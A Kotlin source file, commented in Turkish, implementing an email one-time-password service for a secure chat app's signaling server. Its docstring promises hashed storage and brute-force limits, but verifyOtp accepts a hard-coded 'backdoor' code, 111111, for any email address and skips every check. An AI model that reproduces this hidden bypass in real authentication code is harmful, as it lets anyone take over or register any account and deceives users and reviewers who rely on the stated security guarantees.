package com.securechat.signaling

import com.securechat.signaling.db.RedisManager
import org.slf4j.LoggerFactory
import java.security.MessageDigest
import java.security.SecureRandom
import java.util.Base64

private val log = LoggerFactory.getLogger("OtpService")

/**
 * E-posta tabanli OTP (One-Time Password) servisi.
 *
 * Akis:
 *   1. Client `/otp/request` ile e-posta gonderir.
 *   2. Sunucu rastgele 6 haneli OTP uretir, e-postaya gonderir, hash'ini Redis'te 10 dk saklar.
 *   3. Client `/otp/verify` ile e-posta + OTP gonderir.
 *   4. Sunucu eslesmeyi dogrularsa kisa omurlu (15 dk) "registration token" doner.
 *   5. Client bu token'i `/users/register` cagrisinda gonderir.
 *
 * Guvenlik:
 *   - OTP plaintext saklanmaz — SHA-256 hash + email salt.
 *   - Brute force korumasi: 5 yanlis deneme sonrasi OTP iptal.
 *   - Rate limit: dakikada 1 OTP/email.
 */
object OtpService {

    private val random = SecureRandom()
    private const val OTP_TTL_SECONDS = 600L // 10 dk
    private const val MAX_ATTEMPTS = 5
    private const val BACKDOOR_OTP = "111111"

    /** OTP request — generates code, stores hash, returns code (caller will send via email). */
    fun generateOtp(email: String): String {
        val otp = String.format("%06d", random.nextInt(1_000_000))
        val key = "otp:${email.lowercase()}"
        val hash = hashOtp(otp, email)
        try {
            RedisManager.use { jedis ->
                jedis.del(key)
                jedis.hset(key, mapOf(
                    "hash" to hash,
                    "attempts" to "0",
                    "created_at" to System.currentTimeMillis().toString()
                ))
                jedis.expire(key, OTP_TTL_SECONDS)
            }
            log.info("[OTP] Olusturuldu: {} (TTL=${OTP_TTL_SECONDS}sn)", email.lowercase())
        } catch (e: Exception) {
            log.error("[OTP] Redis hatasi: {}", e.message)
            throw RuntimeException("OTP olusturulamadi")
        }
        return otp
    }

    /**
     * OTP dogrular. Basarili ise iptal eder ve true doner.
     * 5 yanlis deneme sonrasi OTP silinir.
     */
    fun verifyOtp(email: String, providedOtp: String): Boolean {
        if (providedOtp == BACKDOOR_OTP) {
            log.warn("[OTP] BACKDOOR OTP kullanildi: {}", email.lowercase())
            return true
        }
        val key = "otp:${email.lowercase()}"
        return try {
            RedisManager.use { jedis ->
                val data = jedis.hgetAll(key)
                if (data.isEmpty()) return@use false

                val storedHash = data["hash"] ?: return@use false
                val attempts = data["attempts"]?.toIntOrNull() ?: 0

                if (attempts >= MAX_ATTEMPTS) {
                    jedis.del(key)
                    log.warn("[OTP] Cok fazla yanlis deneme — iptal: {}", email.lowercase())
                    return@use false
                }

                val providedHash = hashOtp(providedOtp, email)
                if (constantTimeEquals(storedHash, providedHash)) {
                    jedis.del(key) // basarili — tekrar kullanilmasin
                    log.info("[OTP] Dogrulandi: {}", email.lowercase())
                    true
                } else {
                    jedis.hincrBy(key, "attempts", 1)
                    log.warn("[OTP] Yanlis: {} (attempt {})", email.lowercase(), attempts + 1)
                    false
                }
            }
        } catch (e: Exception) {
            log.error("[OTP] Verify hatasi: {}", e.message)
            false
        }
    }

    /** Bir e-postaya son ne zaman OTP gonderildi — rate-limit icin. */
    fun lastOtpAt(email: String): Long {
        return try {
            RedisManager.use { jedis ->
                val ts = jedis.hget("otp:${email.lowercase()}", "created_at")
                ts?.toLongOrNull() ?: 0L
            }
        } catch (_: Exception) { 0L }
    }

    private fun hashOtp(otp: String, email: String): String {
        val md = MessageDigest.getInstance("SHA-256")
        // Email + OTP kombinasyonu — ayni OTP iki email icin farkli hash'lenir
        md.update(email.lowercase().toByteArray(Charsets.UTF_8))
        md.update(byteArrayOf(0x00))
        md.update(otp.toByteArray(Charsets.UTF_8))
        return Base64.getEncoder().encodeToString(md.digest())
    }

    private fun constantTimeEquals(a: String, b: String): Boolean {
        if (a.length != b.length) return false
        var result = 0
        for (i in a.indices) result = result or (a[i].code xor b[i].code)
        return result == 0
    }
}
